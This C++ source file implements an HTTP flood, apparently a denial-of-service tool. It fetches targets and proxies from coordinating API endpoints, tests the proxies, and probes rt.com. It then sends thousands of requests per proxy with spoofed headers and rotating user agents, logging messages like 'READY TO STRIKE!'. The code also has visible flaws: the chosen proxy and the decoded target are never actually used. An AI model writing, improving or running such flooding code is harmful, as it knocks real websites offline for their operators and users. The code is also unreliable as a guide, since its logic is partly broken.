#include <string>
#include <vector>
#include <atomic>

#include "json.hpp"

#include "curl_wrapper.hpp"
#include "utils.hpp"

constexpr const char *PROXY_PROBING = "https://www.google.com";

constexpr const size_t MAX_PROXY_ATTACKS = 5000;

inline static void Fire(const std::vector<std::string> &apiList, std::atomic<bool> &shouldStop)
{
	CURLWrapper wrapper;

	std::string currentTarget{""};
	std::pair<std::string, std::string> currentProxy;

	bool isProxyValid{false};
	
	size_t currentProxyAttacks{0};

	// Trying to get api response
	while(!shouldStop.load())
	{
		nlohmann::json apiData;
		while(true)
		{
			wrapper.SetTarget(ChoseAPI(apiList));
			auto resp = wrapper.Download();
			if(resp && resp->m_code >= 200 && resp->m_code < 300)
			{
				resp->m_data.push_back('\0');
				try
				{
					apiData = nlohmann::json::parse(resp->m_data.data());
				}
				catch(...)
				{
					std::cerr << "Failed to parse API response" << std::endl;
					std::cout.write(resp->m_data.data(), resp->m_data.size());
					continue;
				}
				break;
			}
		}

		if(apiData.empty())
		{
			break;
		}

		// We should change targe only if we bombarder the first one
		if(currentTarget.empty())
		{
			try
			{
				currentTarget = decodeURL(apiData["site"]["url"]);
			}
			catch(...)
			{
				currentTarget = "";
				break;
			}
		}

		// Probing proxies
		if(!isProxyValid)
		{
			wrapper.SetTarget(PROXY_PROBING);

			for(auto proxy : apiData["proxy"])
			{
				std::string proxyIP = proxy["ip"];
				std::string proxyAuth = proxy["auth"];

				if(const auto index = proxyIP.find("\r");
					index != std::string::npos)
				{
					proxyIP.erase(index, 1);
				}

				const auto respCode = wrapper.Ping(30);
				if(respCode >= 200 && respCode < 300)
				{
					currentProxy = {std::move(proxyIP), std::move(proxyAuth)};
					currentProxyAttacks = 0;
					isProxyValid = true;

					std::cout << "Found valid proxy looking for target" << std::endl;
					break;
				}
			}

			if(!isProxyValid)
			{
				std::cerr << "No valid proxy found, trying to get others" << std::endl;
				continue;
			}
		}

		// Probing target
		wrapper.SetHeaders({
			 {"Content-Type", "application/json"},
			 {"cf-visitor", "https"},
			 {"User-Agent", ChoseUseragent()},
			 {"Connection", "keep-alive"},
			 {"Accept", "application/json, text/plain, */*"},
			 {"Accept-Language", "ru"},
			 {"x-forwarded-proto", "https"},
			 {"Accept-Encoding", "gzip, deflate, br"}
		});
		wrapper.SetTarget("https://www.rt.com/russia/");
		const long targetRespCode = wrapper.Ping(20);
		if(targetRespCode >= 200 && targetRespCode < 300)
		{
			std::cout << "LOCK AND LOAD, READY TO STRIKE!" << std::endl;
		}
		else if(targetRespCode > 500)
		{
			std::cout << "This one is dead looking for target" << std::endl;
			currentTarget = "";
			continue;
		}
		else
		{
			currentTarget = "";
			std::cout << "Something is blocking the way, looking for target" << std::endl;
			continue;
		}

		// Attacking
		for(; currentProxyAttacks < MAX_PROXY_ATTACKS && !shouldStop.load(); currentProxyAttacks++)
		{
			wrapper.SetHeaders({
				 {"Content-Type", "application/json"},
				 {"cf-visitor", "https"},
				 {"User-Agent", ChoseUseragent()},
				 {"Connection", "keep-alive"},
				 {"Accept", "application/json, text/plain, */*"},
				 {"Accept-Language", "ru"},
				 {"x-forwarded-proto", "https"},
				 {"Accept-Encoding", "gzip, deflate, br"}
			});
			const long respCode = wrapper.Ping(20);
			if(respCode >= 200 && respCode < 300)
			{
				std::cout << "Succesfuly attacked!" << std::endl;
			}
		}

		if(currentProxyAttacks >= MAX_PROXY_ATTACKS)
		{
			std::cout << "Current proxy exhausted, looking for other" << std::endl;
		}

	}

}
